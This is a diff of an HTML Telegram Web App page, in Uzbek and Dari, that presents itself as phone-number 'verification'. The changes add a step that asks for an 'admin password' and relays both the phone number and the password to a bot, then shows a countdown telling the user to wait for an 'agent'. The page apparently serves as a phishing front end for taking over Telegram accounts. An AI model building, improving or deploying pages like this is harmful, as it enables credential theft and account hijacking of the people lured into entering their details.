@@ -3,16 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web App Verification</title>
+    <title>Secure Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root {
-            --bg-color: #0f0f12;
-            --card-bg: #1a1a24;
-            --accent-color: #d9b54a;
-            --text-color: #ffffff;
-            --text-secondary: #a0a0b0;
-            --danger-color: #e53935;
+            --bg-color: #ffffff;
+            --card-bg: #f8f9fa;
+            --accent-color: #2c2c2c;
+            --text-color: #212529;
+            --text-secondary: #6c757d;
+            --danger-color: #d93838;
+            --border-color: #dee2e6;
         }
 
         body {
@@ -31,55 +32,63 @@
         .container {
             width: 100%;
             max-width: 400px;
-            padding: 24px;
+            padding: 20px;
             box-sizing: border-box;
         }
 
         .card {
             background: var(--card-bg);
-            border-radius: 16px;
-            padding: 24px;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
-            border: 1px solid rgba(217, 181, 74, 0.2);
+            border-radius: 20px;
+            padding: 28px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            border: 1px solid var(--border-color);
             text-align: center;
+        }
+
+        /* Bayroq stikerlari orqali til tanlash */
+        .flag-selector {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+
+        .flag-btn {
+            background: #ffffff;
+            border: 2px solid var(--border-color);
+            border-radius: 50%;
+            width: 55px;
+            height: 55px;
+            font-size: 28px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+        }
+
+        .flag-btn.active {
+            border-color: var(--accent-color);
+            transform: scale(1.08);
+            box-shadow: 0 6px 15px rgba(0,0,0,0.12);
         }
 
         .title {
             font-size: 20px;
-            font-weight: 700;
+            font-weight: 600;
+            font-style: italic;
+            color: var(--text-color);
             margin-bottom: 8px;
-            letter-spacing: 0.5px;
+            letter-spacing: 0.3px;
         }
 
         .subtitle {
             font-size: 13px;
+            font-style: italic;
             color: var(--text-secondary);
             margin-bottom: 24px;
-            line-height: 1.4;
-        }
-
-        .lang-selector {
-            display: flex;
-            gap: 12px;
-            margin-bottom: 24px;
-        }
-
-        .lang-btn {
-            flex: 1;
-            padding: 12px;
-            background: #252538;
-            border: 1px solid #33334d;
-            border-radius: 8px;
-            color: var(--text-color);
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-
-        .lang-btn.active {
-            background: var(--accent-color);
-            color: #000;
-            border-color: var(--accent-color);
+            line-height: 1.5;
         }
 
         .form-group {
@@ -89,104 +98,116 @@
 
         label {
             display: block;
-            font-size: 12px;
+            font-size: 11px;
+            font-style: italic;
             color: var(--text-secondary);
             margin-bottom: 6px;
-            text-transform: uppercase;
             letter-spacing: 0.8px;
+            font-weight: 600;
         }
 
-        input[type="tel"] {
+        input {
             width: 100%;
-            padding: 14px;
-            background: #0f0f12;
-            border: 1px solid #33334d;
-            border-radius: 8px;
+            padding: 14px 16px;
+            background: #ffffff;
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
             color: var(--text-color);
-            font-size: 16px;
+            font-size: 15px;
+            font-style: italic;
             box-sizing: border-box;
             outline: none;
+            transition: border-color 0.2s;
         }
 
-        input[type="tel"]:focus {
+        input:focus {
             border-color: var(--accent-color);
         }
 
         .notice {
             font-size: 11px;
+            font-style: italic;
             color: var(--danger-color);
             margin-bottom: 20px;
+            letter-spacing: 0.6px;
+            font-weight: 700;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
-            font-weight: 600;
         }
 
         .btn-submit {
             width: 100%;
             padding: 14px;
             background: var(--accent-color);
-            color: #000;
+            color: #ffffff;
             border: none;
-            border-radius: 8px;
+            border-radius: 12px;
             font-size: 15px;
-            font-weight: 700;
+            font-style: italic;
+            font-weight: 600;
             cursor: pointer;
-            transition: opacity 0.2s;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            transition: opacity 0.2s, transform 0.1s;
         }
 
-        .btn-submit:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
+        .btn-submit:active {
+            transform: scale(0.98);
         }
 
-        .timer-screen {
+        .timer-screen, .password-screen {
             display: none;
         }
 
         .timer-display {
-            font-size: 32px;
-            font-weight: 800;
+            font-size: 36px;
+            font-weight: 700;
             color: var(--accent-color);
             margin: 20px 0;
             font-family: monospace;
         }
 
         .status-text {
-            font-size: 14px;
+            font-size: 13px;
+            font-style: italic;
             color: var(--text-secondary);
-            margin-bottom: 12px;
+            margin-bottom: 16px;
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <!-- Step 1: Language Selection & Input -->
+    <!-- 1-Qadam: Til (Stiker) va Ma'lumot kiritish -->
     <div class="card" id="step-input">
-        <div class="lang-selector">
-            <button class="lang-btn active" id="btn-uz" onclick="setLanguage('uz')">Oʻzbekcha</button>
-            <button class="lang-btn" id="btn-af" onclick="setLanguage('af')">دری (Dari)</button>
+        <div class="flag-selector">
+            <button class="flag-btn active" onclick="setLanguage('uz')" title="O'zbekcha">🇺🇿</button>
+            <button class="flag-btn" onclick="setLanguage('af')" title="Dari">🇦🇫</button>
         </div>
 
         <div class="title" id="txt-title">Telefon raqamni tasdiqlash</div>
         <div class="subtitle" id="txt-subtitle">Ilovadan foydalanish uchun shaxsingizni tasdiqlashingiz kerak.</div>
 
-        <div class="form-group">
-            <label id="txt-label">Telefon raqamingiz</label>
+        <div class="form-group" id="phone-group">
+            <label id="txt-label">TELEFON RAQAMINGIZ</label>
             <input type="tel" id="phone-input" placeholder="+998 90 123 45 67">
         </div>
 
-        <div class="notice" id="txt-notice">Kirish bor chiqish yoʻq</div>
+        <!-- Parol kiritish maydoni (agar oldin ro'yxatdan o'tgan bo'lsa) -->
+        <div class="form-group password-screen" id="step-password">
+            <label id="txt-pass-label">ADMIN PAROLI</label>
+            <input type="password" id="password-input" placeholder="Parolni kiriting">
+        </div>
 
-        <button class="btn-submit" id="txt-btn" onclick="submitData()">Tasdiqlash</button>
+        <div class="notice" id="txt-notice">Kirish bor chiqish yo'q</div>
+
+        <button class="btn-submit" id="txt-btn" onclick="handleSubmit()">Tasdiqlash</button>
     </div>
 
-    <!-- Step 2: Timer Screen -->
+    <!-- 2-Qadam: 2 minutlik Taymer ekrani -->
     <div class="card timer-screen" id="step-timer">
         <div class="title" id="timer-title">Agent tasdiqlashini kuting</div>
-        <div class="timer-display" id="timer-count">05:00</div>
-        <div class="status-text" id="timer-status">Maʼlumotlar koʻrib chiqilmoqda...</div>
-        <div class="notice" id="timer-notice">Kirish bor chiqish yoʻq</div>
+        <div class="timer-display" id="timer-count">02:00</div>
+        <div class="status-text" id="timer-status">Ma'lumotlar tekshirilmoqda...</div>
+        <div class="notice" id="timer-notice">Kirish bor chiqish yo'q</div>
     </div>
 </div>
 
@@ -195,21 +216,24 @@
     tg.expand();
 
     let currentLang = 'uz';
+    let isRegistered = localStorage.getItem('verified_user') === 'true';
 
     const translations = {
         uz: {
             title: "Telefon raqamni tasdiqlash",
             subtitle: "Ilovadan foydalanish uchun shaxsingizni tasdiqlashingiz kerak.",
-            label: "Telefon raqamingiz",
-            notice: "Kirish bor chiqish yoʻq",
+            label: "TELEFON RAQAMINGIZ",
+            passLabel: "ADMIN PAROLI",
+            notice: "Kirish bor chiqish yo'q",
             btn: "Tasdiqlash",
             timerTitle: "Agent tasdiqlashini kuting",
-            timerStatus: "Maʼlumotlar koʻrib chiqilmoqda..."
+            timerStatus: "Ma'lumotlar tekshirilmoqda..."
         },
         af: {
             title: "تایید شماره تلیفون",
             subtitle: "برای استفاده از اپلیکیشن باید هویت خود را تایید کنید.",
             label: "شماره تلیفون شما",
+            passLabel: "رمز عبور ادمین",
             notice: "ورود هست برگشت نیست",
             btn: "تایید",
             timerTitle: "منتظر تایید ایجنټ باشید",
@@ -217,15 +241,23 @@
         }
     };
 
+    // Agar foydalanuvchi oldindan ro'yxatdan o'tgan bo'lsa, faqat parol maydonini chiqaramiz
+    if (isRegistered) {
+        document.getElementById('phone-group').style.display = 'none';
+        document.getElementById('step-password').style.display = 'block';
+    }
+
     function setLanguage(lang) {
         currentLang = lang;
-        document.getElementById('btn-uz').classList.toggle('active', lang === 'uz');
-        document.getElementById('btn-af').classList.toggle('active', lang === 'af');
+        const buttons = document.querySelectorAll('.flag-btn');
+        buttons[0].classList.toggle('active', lang === 'uz');
+        buttons[1].classList.toggle('active', lang === 'af');
 
         const t = translations[lang];
-        document.getElementById('txt-title').innerText = t.title;
+        document.getElementById('txt-title').innerText = isRegistered ? (lang === 'uz' ? "Tizimga kirish" : "ورود به سیستم") : t.title;
         document.getElementById('txt-subtitle').innerText = t.subtitle;
         document.getElementById('txt-label').innerText = t.label;
+        document.getElementById('txt-pass-label').innerText = t.passLabel;
         document.getElementById('txt-notice').innerText = t.notice;
         document.getElementById('txt-btn').innerText = t.btn;
         document.getElementById('timer-title').innerText = t.timerTitle;
@@ -252,32 +284,44 @@
         }, 1000);
     }
 
-    function submitData() {
-        const phone = document.getElementById('phone-input').value;
-        if (!phone || phone.length < 7) {
-            alert(currentLang === 'uz' ? "Raqamni toʻgʻri kiriting" : "شماره را درست وارد کنید");
-            return;
+    function handleSubmit() {
+        if (!isRegistered) {
+            const phone = document.getElementById('phone-input').value;
+            if (!phone || phone.length < 7) {
+                alert(currentLang === 'uz' ? "Raqamni to'g'ri kiriting" : "شماره را درست وارد کنید");
+                return;
+            }
+
+            // Botga raqamni yuborish
+            tg.sendData(JSON.stringify({
+                type: "phone",
+                phone: phone,
+                lang: currentLang
+            }));
+
+            // Saqlab qo'yamiz, keyingi safar faqat parol so'raydi
+            localStorage.setItem('verified_user', 'true');
+        } else {
+            const password = document.getElementById('password-input').value;
+            if (!password) {
+                alert(currentLang === 'uz' ? "Parolni kiriting" : "رمز عبور را وارد کنید");
+                return;
+            }
+
+            // Botga parolni tekshirish uchun yuborish
+            tg.sendData(JSON.stringify({
+                type: "password",
+                password: password,
+                lang: currentLang
+            }));
         }
 
-        // WebApp ma'lumotlarini botga yuborish
-        const payload = {
-            phone: phone,
-            lang: currentLang
-        };
-
-        tg.sendData(JSON.stringify(payload));
-
-        // UI holatini taymerga o'tkazish
+        // 2 minutlik taymer ekraniga o'tish
         document.getElementById('step-input').style.display = 'none';
         document.getElementById('step-timer').style.display = 'block';
         
-        startTimer(300); // 5 daqiqalik taymer
+        startTimer(120); // 2 minut (120 soniya)
     }
-
-    // Sahifa qayta yuklanganda taymer holatini tekshirish (agar saqlangan bo'lsa)
-    window.onload = function() {
-        setLanguage('uz');
-    };
 </script>
 </body>
 </html>
